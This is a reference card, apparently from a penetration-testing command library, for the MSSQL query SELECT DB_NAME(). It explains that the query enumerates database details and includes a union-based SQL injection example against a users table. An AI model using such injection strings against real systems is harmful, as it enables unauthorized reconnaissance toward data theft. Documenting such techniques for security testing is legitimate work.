---
id: 328178f8-b898-4476-8c29-994a87a849b2
name: mssql-select-db-name
type: command
executor: sql
data: SELECT DB_NAME()
output: null
created_at: '2023-04-06T03:56:35.631952+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Database
tags:
  - mssql
  - enumeration
verified: true
validated: true
---

# mssql-select-db-name

## Command

```sql
SELECT DB_NAME()
```

## Description

This SQL command retrieves the name of the current database in an MSSQL Server instance. It is used in penetration testing to enumerate database details via direct access or injection, helping attackers map the target's data environment during discovery.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | The function takes no parameters; it returns the current database context. | N/A |

## Examples

### Basic Usage

```sql
SELECT DB_NAME()
```

### Injected Usage (Union-Based)

```sql
SELECT column1, column2 FROM users WHERE id=1 UNION SELECT DB_NAME(), NULL --
```

## Expected Output

The command returns a single string value representing the database name, such as:

```
master
```

Or in a full query result:

| (No column name) |
|------------------|
| MyDatabase       |

Success is confirmed if the database name is displayed without syntax errors.

## Related

- [[procedures/MSSQL-Database-Name-Enumeration]]
- [[techniques/System-Information-Discovery|T1082]]
